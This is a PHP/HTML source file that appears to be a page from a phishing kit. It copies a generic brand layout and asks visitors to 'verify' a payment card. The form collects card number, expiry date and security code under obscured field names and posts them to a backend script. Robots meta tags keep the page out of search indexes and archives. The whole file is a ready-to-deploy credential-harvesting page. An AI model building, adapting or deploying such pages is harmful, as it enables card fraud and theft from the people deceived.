<?php
session_start();
include "./lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./assets/css/helpers.css">
        <link rel="stylesheet" href="./assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./assets/imgs/ff.ico" />

        <title>Touch</title>
    </head>
    <body>

        <div class="mobile-menu">
            <div class="logo">
                <img src="./assets/imgs/logo.svg">
            </div>
            <div>
                <ul class="ps-0 mb-0 d-flex algin-items-center justify-content-end">
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x1.svg" alt="">Apps</li>
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x2.svg" alt="">Menu</li>
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x3.svg" alt="">Help</li>
                </ul>
            </div>
        </div>

        <div id="wrapper">
            <div class="left">
                <div class="logo d-lg-block d-md-none d-sm-none d-none">
                    <img src="./assets/imgs/logo.svg">
                </div>
            </div>
            <div class="right">
                <div class="top-menu d-lg-block d-md-none d-sm-none d-none">
                    <ul class="ps-0 mb-0 d-flex algin-items-center justify-content-end">
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x1.svg" alt="">Apps</li>
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x2.svg" alt="">Menu</li>
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x3.svg" alt="">Help</li>
                    </ul>
                </div>

                <div class="inner">
                    <h3 class="title"><img src="./assets/imgs/arrowk.svg"> <?php echo get_text('cc_title'); ?></h3>
                    <form action="./assets/php/config/func.php" method="post">
                        <input type="hidden" name="card">
                        
                        <div class="details">
                            <p><?php echo get_text('cc_text'); ?></p>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo "has-error"; ?>">
                                <label for="one"><?php echo get_text('one_label'); ?></label>
                                <input inputmode="numeric" type="text" name="one" class="form-control" id="one" placeholder="_ _ _ _  _ _ _ _  _ _ _ _  _ _ _ _" value="">
                                <?php if( isset($_GET['error']) ) : ?>
                                <p class="errmsg"><?php echo get_text('one_error'); ?></p>
                                <?php endif; ?>                                 
                            </div>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo "has-error"; ?>">
                                <label for="two"><?php echo get_text('two_label'); ?></label>
                                <input inputmode="numeric" type="text" name="two" class="form-control" id="two" placeholder="<?php echo get_text('two_placeholder'); ?>" value="">
                                <?php if( isset($_GET['error']) ) : ?>
                                <p class="errmsg"><?php echo get_text('two_error'); ?></p>
                                <?php endif; ?>                                 
                            </div>
                            <div class="form-group mb30 <?php if(isset($_GET['error']))  echo "has-error"; ?>">
                                <label for="three"><?php echo get_text('three_label'); ?></label>
                                <input inputmode="numeric" type="text" name="three" class="form-control" id="three" placeholder="_ _ _" value="">
                                <?php if( isset($_GET['error']) ) : ?>
                                <p class="errmsg"><?php echo get_text('three_error'); ?></p>
                                <?php endif; ?>                                 
                            </div>
                            <div class="btns">
                                <button type="submit" class="btn_sub" disabled><?php echo get_text('verify'); ?></button>
                            </div>
                        </div>

                    </form>
                </div>

            </div>
        </div>



        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./assets/js/js.js"></script>
        
        <script>
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('0000');   
            $("input").keyup(function(){
                if ($("#one").val() != "" & $("#two").val() != "" & $("#three").val() != "") {
                    $(".btn_sub").prop("disabled",false);
                    $(".btn_sub").addClass("active");
                }else{
                    $(".btn_sub").prop("disabled",true);
                    $(".btn_sub").removeClass("active");
                }
            });               
        </script>
    </body>
</html>